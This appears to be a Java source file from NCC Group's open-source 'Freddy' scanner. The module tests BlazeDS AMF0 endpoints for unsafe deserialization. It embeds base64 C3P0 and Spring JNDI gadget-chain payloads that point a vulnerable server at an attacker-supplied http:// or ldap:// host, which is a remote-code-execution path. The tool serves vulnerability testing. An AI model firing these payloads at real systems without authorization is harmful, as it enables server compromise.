// Freddy the Serial(isation) Killer
// 
// Released as open source by NCC Group Plc - https://www.nccgroup.trust/
//
// Project link: https://github.com/nccgroup/freddy/
//
// Released under agpl-3.0 see LICENSE for more information

package nb.freddy.modules.java;

import nb.freddy.modules.FreddyModuleBase;
import nb.freddy.modules.SeverityRating;
import nb.freddy.modules.TargetPlatform;

import java.util.regex.Pattern;

/***********************************************************
 * Module targeting the AMF 0 format support of the Java
 * BlazeDS library.
 *
 * Written by Nicky Bloor (@NickstaDB).
 **********************************************************/
public class BlazeDSAMF0Module extends FreddyModuleBase {
    //C3P0WrapperConnPool payload data
    private static final int C3P0WRAP_PAYLOAD_CMD_OFFSET = 1154;
    private static final String C3P0WRAP_PREFIX_B64 = "EAAzY29tLm1jaGFuZ2UudjIuYzNwMC5XcmFwcGVyQ29ubmVjdGlvblBvb2xEYXRhU291cmNlABV1c2VyT3ZlcnJpZGVzQXNTdHJpbmcCBc9IZXhBc2NpaVNlcmlhbGl6ZWRNYXA6YWNlZDAwMDU3MzcyMDAzZDYzNmY2ZDJlNmQ2MzY4NjE2ZTY3NjUyZTc2MzIyZTZlNjE2ZDY5NmU2NzJlNTI2NTY2NjU3MjY1NmU2MzY1NDk2ZTY0Njk3MjY1NjM3NDZmNzIyNDUyNjU2NjY1NzI2NTZlNjM2NTUzNjU3MjY5NjE2YzY5N2E2NTY0NjIxOTg1ZDBkMTJhYzIxMzAyMDAwNDRjMDAwYjYzNmY2ZTc0NjU3ODc0NGU2MTZkNjU3NDAwMTM0YzZhNjE3NjYxNzgyZjZlNjE2ZDY5NmU2NzJmNGU2MTZkNjUzYjRjMDAwMzY1NmU3Njc0MDAxNTRjNmE2MTc2NjEyZjc1NzQ2OTZjMmY0ODYxNzM2ODc0NjE2MjZjNjUzYjRjMDAwNDZlNjE2ZDY1NzEwMDdlMDAwMTRjMDAwOTcyNjU2NjY1NzI2NTZlNjM2NTc0MDAxODRjNmE2MTc2NjE3ODJmNmU2MTZkNjk2ZTY3MmY1MjY1NjY2NTcyNjU2ZTYzNjUzYjc4NzA3MDcwNzA3MzcyMDAxNjZhNjE3NjYxNzgyZTZlNjE2ZDY5NmU2NzJlNTI2NTY2NjU3MjY1NmU2MzY1ZThjNjllYTJhOGU5OGQwOTAyMDAwNDRjMDAwNTYxNjQ2NDcyNzM3NDAwMTI0YzZhNjE3NjYxMmY3NTc0Njk2YzJmNTY2NTYzNzQ2ZjcyM2I0YzAwMGM2MzZjNjE3MzczNDY2MTYzNzQ2ZjcyNzk3NDAwMTI0YzZhNjE3NjYxMmY2YzYxNmU2NzJmNTM3NDcyNjk2ZTY3M2I0YzAwMTQ2MzZjNjE3MzczNDY2MTYzNzQ2ZjcyNzk0YzZmNjM2MTc0Njk2ZjZlNzEwMDdlMDAwNzRjMDAwOTYzNmM2MTczNzM0ZTYxNmQ2NTcxMDA3ZTAwMDc3ODcwNzM3MjAwMTA2YTYxNzY2MTJlNzU3NDY5NmMyZTU2NjU2Mzc0NmY3MmQ5OTc3ZDViODAzYmFmMDEwMzAwMDM0OTAwMTE2MzYxNzA2MTYzNjk3NDc5NDk2ZTYzNzI2NTZkNjU2ZTc0NDkwMDBjNjU2YzY1NmQ2NTZlNzQ0MzZmNzU2ZTc0NWIwMDBiNjU2YzY1NmQ2NTZlNzQ0NDYxNzQ2MTc0MDAxMzViNGM2YTYxNzY2MTJmNmM2MTZlNjcyZjRmNjI2YTY1NjM3NDNiNzg3MDAwMDAwMDAwMDAwMDAwMDA3NTcyMDAxMzViNGM2YTYxNzY2MTJlNmM2MTZlNjcyZTRmNjI2YTY1NjM3NDNiOTBjZTU4OWYxMDczMjk2YzAyMDAwMDc4NzAwMDAwMDAwYTcwNzA3MDcwNzA3MDcwNzA3MDcwNzg3NDAwMDY0NjcyNjU2NDY0Nzk3NDAwYzg=";
    private static final String C3P0WRAP_SUFFIX_B64 = "NzQwMDAzNDY2ZjZmOwAACQ==";
    //SpringPropertyPathFactory payload data
    private static final int SPPF_PAYLOAD_CMD_OFFSET1 = 86;
    private static final int SPPF_PAYLOAD_CMD_OFFSET2 = 448;
    private static final String SPPF_PREFIX_B64 = "EABAb3JnLnNwcmluZ2ZyYW1ld29yay5iZWFucy5mYWN0b3J5LmNvbmZpZy5Qcm9wZXJ0eVBhdGhGYWN0b3J5QmVhbgAOdGFyZ2V0QmVhbk5hbWUCAMg=";
    private static final String SPPF_MIDDLE_B64 = "AAxwcm9wZXJ0eVBhdGgCAANmb28AC2JlYW5GYWN0b3J5EAA2b3JnLnNwcmluZ2ZyYW1ld29yay5qbmRpLnN1cHBvcnQuU2ltcGxlSm5kaUJlYW5GYWN0b3J5ABJzaGFyZWFibGVSZXNvdXJjZXMQACFmbGV4Lm1lc3NhZ2luZy5pby5BcnJheUNvbGxlY3Rpb24ABnNvdXJjZQoAAAABAgDI";
    private static final String SPPF_SUFFIX_B64 = "AAAJAAAJAAAJ";
    private byte[] C3P0WRAP_PAYLOAD;
    private byte[] SPPF_PAYLOAD;

    protected void initialiseModule() {
        setName("BlazeDS-AMF0");
        setPlatform(TargetPlatform.JAVA);
        setModuleIsRCECapable(true);
        setDescriptionCaveats("");
        setRemediationDetail("");
        setSeverity(SeverityRating.HIGH);

        //Initialise payload buffers
        C3P0WRAP_PAYLOAD = buildBinaryPayloadBuffer(C3P0WRAP_PREFIX_B64, C3P0WRAP_SUFFIX_B64, true); //Note, this payload isn't actually unicode but is encoded as hex-ascii so requires two bytes space per byte of payload
        SPPF_PAYLOAD = buildBinaryPayloadBuffer(SPPF_PREFIX_B64, SPPF_MIDDLE_B64, SPPF_SUFFIX_B64, false);

        //Register active scan payloads (passive scan is handled by BlazeDSPassiveDetectionModule)
        registerActiveScanExceptionPayload(new byte[]{0x10, 0x00, 0x0b, 0x46, 0x72, 0x65, 0x64, 0x64, 0x79, 0x44, 0x65, 0x73, 0x65, 0x72}, Pattern.compile("Cannot create class of type ((')|(&#39;))FreddyDeser((')|(&#39;))\\."));

        registerActiveScanCollaboratorPayload(PN_C3P0WCP, true);
        registerActiveScanCollaboratorPayload(PN_SPRINGPPF, true);
    }

    protected byte[] generateCollaboratorBytePayload(String payloadName, String hostname) {
        switch (payloadName) {
            case PN_C3P0WCP:
                return generateBinaryPayloadWithAscHexCommand(C3P0WRAP_PAYLOAD, C3P0WRAP_PAYLOAD_CMD_OFFSET, "http://" + hostname + "/");

            case PN_SPRINGPPF:
                return generateBinaryPayload(SPPF_PAYLOAD, SPPF_PAYLOAD_CMD_OFFSET1, SPPF_PAYLOAD_CMD_OFFSET2, "ldap://" + hostname + "/", false);
        }
        return null;
    }
}
